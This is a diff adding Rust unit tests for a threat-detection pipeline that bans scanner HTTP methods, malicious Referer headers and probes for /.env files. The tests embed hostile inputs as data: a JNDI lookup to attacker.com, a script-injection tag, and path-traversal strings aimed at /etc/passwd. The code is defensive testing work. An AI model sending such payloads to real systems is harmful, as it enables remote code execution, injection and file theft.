@@ -260,3 +260,118 @@ fn test_probe_with_status_code_filtering() {
     );
     assert!(matches!(action_200, PipelineAction::Allow));
 }
+
+#[test]
+fn test_scanner_methods_are_banned() {
+    let pipeline = ThreatPipeline::new_test_instance();
+    let scanner_methods = ["PROPFIND", "DEBUG", "SEARCH", "TRACK", "TRACE"];
+    for method in scanner_methods {
+        let action = pipeline.evaluate_request(
+            "203.0.113.15".parse().unwrap(),
+            None,
+            "Mozilla/5.0",
+            method,
+            "/",
+            200,
+            "",
+        );
+        match action {
+            PipelineAction::Ban { reason, permanent } => {
+                assert!(reason.starts_with("scanner_method:"));
+                assert!(!permanent);
+            }
+            _ => panic!("scanner method must be banned"),
+        }
+    }
+
+    let safe_action = pipeline.evaluate_request(
+        "203.0.113.15".parse().unwrap(),
+        None,
+        "Mozilla/5.0",
+        "GET",
+        "/",
+        200,
+        "",
+    );
+    assert_eq!(safe_action, PipelineAction::Allow);
+}
+
+#[test]
+fn test_referer_injection_attacks_are_banned() {
+    let pipeline = ThreatPipeline::new_test_instance();
+    let malicious_referers = [
+        "${jndi:ldap://attacker.com/exploit}",
+        "<script>alert(1)</script>",
+        "https://example.com/../../etc/passwd",
+        "https://example.com/..\\..\\windows\\system32",
+    ];
+
+    for referer in malicious_referers {
+        let action = pipeline.evaluate_request(
+            "203.0.113.20".parse().unwrap(),
+            None,
+            "Mozilla/5.0",
+            "GET",
+            "/",
+            200,
+            referer,
+        );
+        match action {
+            PipelineAction::Ban { reason, permanent } => {
+                assert!(reason.starts_with("harmful_referer:"));
+                assert!(permanent);
+            }
+            _ => panic!("referer injection must be banned"),
+        }
+    }
+
+    let benign_action = pipeline.evaluate_request(
+        "203.0.113.20".parse().unwrap(),
+        None,
+        "Mozilla/5.0",
+        "GET",
+        "/",
+        200,
+        "https://www.google.com/search?q=rust",
+    );
+    assert_eq!(benign_action, PipelineAction::Allow);
+}
+
+#[test]
+fn test_probe_status_differentiation() {
+    let pipeline = ThreatPipeline::new_test_instance();
+
+    let action_404 = pipeline.evaluate_request(
+        "203.0.113.25".parse().unwrap(),
+        None,
+        "Mozilla/5.0",
+        "GET",
+        "/.env",
+        404,
+        "",
+    );
+    match action_404 {
+        PipelineAction::Ban { reason, permanent } => {
+            assert_eq!(reason, "harmful_probe:.env:404");
+            assert!(permanent);
+        }
+        _ => panic!("probe on 404 must be banned"),
+    }
+
+    let action_200 = pipeline.evaluate_request(
+        "203.0.113.25".parse().unwrap(),
+        None,
+        "Mozilla/5.0",
+        "GET",
+        "/.env",
+        200,
+        "",
+    );
+    match action_200 {
+        PipelineAction::Ban { reason, permanent } => {
+            assert_eq!(reason, "harmful_probe:.env");
+            assert!(permanent);
+        }
+        _ => panic!("probe on 200 must be banned"),
+    }
+}
